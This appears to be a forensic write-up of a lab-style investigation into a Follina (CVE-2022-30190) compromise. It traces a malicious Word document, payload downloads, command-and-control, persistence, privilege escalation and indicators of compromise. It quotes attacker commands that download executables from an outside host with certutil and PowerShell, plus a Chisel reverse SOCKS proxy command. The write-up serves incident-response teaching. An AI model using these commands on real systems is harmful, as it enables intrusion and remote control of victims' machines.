# TEMPEST Incident Investigation Report

## Executive Summary

During investigation of a compromised host, evidence revealed exploitation of the **Follina vulnerability (CVE-2022-30190)** delivered through a malicious Word document.

The attacker downloaded multiple payloads, established command and control communication, escalated privileges, and created persistence.

---

## Initial Access

The victim downloaded the malicious file:

http://phishteam.xyz/02dcf07/free_magicules.doc

Saved location:

C:\Users\benimaru\Downloads\free_magicules.doc

---

## Exploitation

The document executed:

WINWORD.EXE

This triggered execution of:

msdt.exe

This behavior matches exploitation of:

CVE-2022-30190 (Follina)

---

## Payload Delivery

The attacker used certutil to download payloads.

Command:

certutil -urlcache -split -f http://phishteam.xyz/02dcf07/first.exe

Downloaded file:

C:\Users\Public\Downloads\first.exe

---

## PowerShell Execution

PowerShell downloaded additional payloads.

powershell iwr http://phishteam.xyz/02dcf07/spf.exe -outfile spf.exe

---

## Command and Control

Malware communicated with:

resolvecyber.xyz

Example request:

GET /9ab62b5?q=<encoded data>

---

## Persistence

Persistence created using Startup folder:

C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.lnk

---

## Reverse Proxy

Chisel reverse SOCKS proxy executed:

ch.exe client 167.71.199.191:8080 R:socks

---

## Privilege Escalation

PrintSpoofer used to escalate privileges.

Binary:

spf.exe

---

## Indicators of Compromise

Domains

phishteam.xyz  
resolvecyber.xyz

IPs

167.71.199.191  
167.71.222.162

---

## Conclusion

The attacker achieved full compromise using a multi-stage attack chain including:

- phishing
- exploitation
- payload delivery
- C2 communication
- persistence
- privilege escalation
